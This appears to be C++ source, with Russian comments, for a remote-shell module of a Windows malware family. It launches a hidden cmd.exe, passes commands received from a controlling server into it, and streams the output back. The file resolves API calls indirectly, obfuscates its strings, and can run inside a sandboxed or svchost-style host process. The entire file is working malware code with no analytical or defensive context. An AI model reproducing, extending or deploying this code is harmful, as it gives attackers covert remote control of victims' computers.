#include "core\core.h"
#include "core\pipe.h"
#include "core\debug.h"
#include "core\process.h"
#include "main.h"
#include "manager.h"
#include "other.h"
#include "sandbox.h"

class WinCmdServer : public PipeServer
{
		HANDLE stdoutReadHandle, stdoutWriteHandle;
		HANDLE stdinReadHandle, stdinWriteHandle;
		HANDLE hprocess;
		DWORD pid;
		uint idStream;
		bool stop;

		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();

	public:

		WinCmdServer();
		~WinCmdServer();

		bool Init();
		void Release();
		void SetIdStream( uint id )
		{
			idStream = id;
		}
		bool IsStop() const
		{
			return stop;
		}
		//считывает данные от запущенного cmd.exe и отсылает их на сервер
		void LoopReaderFromCmd();

};

static void HandlerCreatedPipeStream( Pipe::AutoMsg msg, DWORD tag );
//считывает данные с потока cmd.exe и отправляет на сервер
static DWORD WINAPI LoopReaderFromCmdThread( void* );

WinCmdServer::WinCmdServer()
{
	stdoutReadHandle = stdoutWriteHandle = 0;
	stdinReadHandle = stdinWriteHandle = 0;
	hprocess = 0;
	stop = false;
}

WinCmdServer::~WinCmdServer()
{
}

void WinCmdServer::Release()
{
	API(KERNEL32, CloseHandle)(stdoutReadHandle);
	API(KERNEL32, CloseHandle)(stdoutWriteHandle);
	API(KERNEL32, CloseHandle)(stdinReadHandle);
	API(KERNEL32, CloseHandle)(stdinWriteHandle);
	if( hprocess )
	{
		API(KERNEL32, TerminateProcess)( hprocess, 0 );
		API(KERNEL32, CloseHandle)(hprocess);
	}
}

bool WinCmdServer::Init()
{
    SECURITY_ATTRIBUTES saAttr; 
    Mem::Zero(saAttr); 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

	if( !API(KERNEL32, CreatePipe)( &stdoutReadHandle, &stdoutWriteHandle, &saAttr, 0 ) ) return false;
	if( !API(KERNEL32, CreatePipe)( &stdinReadHandle, &stdinWriteHandle, &saAttr, 0 ) ) return false;


    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	memset( &si, 0, sizeof(si) );
	memset( &pi, 0, sizeof(pi) );
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stdoutWriteHandle;
    si.hStdOutput = stdoutWriteHandle;
    si.hStdInput = stdinReadHandle;
    si.dwFlags |= STARTF_USESTDHANDLES;

	if( !API(KERNEL32, CreateProcessA)( 0, _CS_("cmd.exe"), 0, 0, TRUE, 0, 0, 0, &si, &pi ) ) return false;

	hprocess = pi.hProcess;
	pid = pi.dwProcessId;

	API(KERNEL32, CloseHandle)(pi.hThread);

	ManagerServer::CreateVideoPipeStream( _CS_("cmd"), name, HandlerCreatedPipeStream, 0, (DWORD)this );
	return true;
}

int WinCmdServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case 1: //отсылка данных в cmd.exe
			{
				DbgMsg( "Для cmd.exe пришло сообщение длиною %d", msgIn->sz_data );
				DWORD rd;
				if( !API(KERNEL32, WriteFile)( stdinWriteHandle, msgIn->data, msgIn->sz_data, &rd, NULL ) )
				{
					ret = -1;
					stop = true;
				}
			}
			break;
	}
	return ret;
}

void WinCmdServer::LoopReaderFromCmd()
{
	const int size_buf = 4096;
	byte* buf = (byte*)Mem::Alloc(size_buf);
	if( buf )
	{
		while( !stop && Process::IsAlive(hprocess) )
		{
			DWORD rd, avail;
			if( !API(KERNEL32, PeekNamedPipe)( stdoutReadHandle, buf, size_buf, &rd, &avail, 0 ) ) break;
			if( rd > 0 )
			{
				while( avail > 0 )
				{
					int sz = avail;
					if( sz > size_buf ) sz = size_buf;
					API(KERNEL32, ReadFile)( stdoutReadHandle, buf, sz, &rd, NULL );
					ManagerServer::SendVideoStream( idStream, buf, rd );
					avail -= sz;
				}
			}
			Delay(200);
		}
		DbgMsg( "Процесс cmd.exe завершен" );
		Mem::Free(buf);
		Stop();
	}
	stop = true;
}

void WinCmdServer::Disconnect()
{
	DbgMsg( "WinCmdServer остановлен" );
	stop = true;
	ManagerServer::CloseStream(idStream);
}

void HandlerCreatedPipeStream( Pipe::AutoMsg msg, DWORD tag )
{
	WinCmdServer* wincmd = (WinCmdServer*)tag;
	int idStream = *((uint*)msg->data);
	wincmd->SetIdStream(idStream);
	DbgMsg( "Получен id для потока cmd.exe %d", idStream );
	RunThread( LoopReaderFromCmdThread, wincmd ); //отсылка данных с pipe на сервер
}

DWORD WINAPI LoopReaderFromCmdThread( void* v )
{
	WinCmdServer* wincmd = (WinCmdServer*)v;
	wincmd->LoopReaderFromCmd();
	return 0;
}

static DWORD WINAPI WinCmdProcess( void* )
{
	if( (Config::state & NOT_USED_SCVHOST) == 0 )
	{
		Sandbox::Init();
		if( !Pipe::InitServerPipeResponse() ) return 0;
	}
	WinCmdServer* wincmd = new WinCmdServer();
	if( wincmd->Init() )
	{
		wincmd->Start(true); //запуск приема pipe сообщений от сервера
	}
	Delay(5000);
	delete wincmd;
	if( (Config::state & NOT_USED_SCVHOST) == 0 )
		API(KERNEL32, ExitProcess)(0);
	return 0;
}

namespace WinCmd
{

void Start( const char* nameUser )
{
	if( Config::state & NOT_USED_SCVHOST )
	{
		RunThread( WinCmdProcess, 0 );
	}
	else
	{
		Sandbox::Run( WinCmdProcess, nameUser, 0, 0, false );
	}
}

}
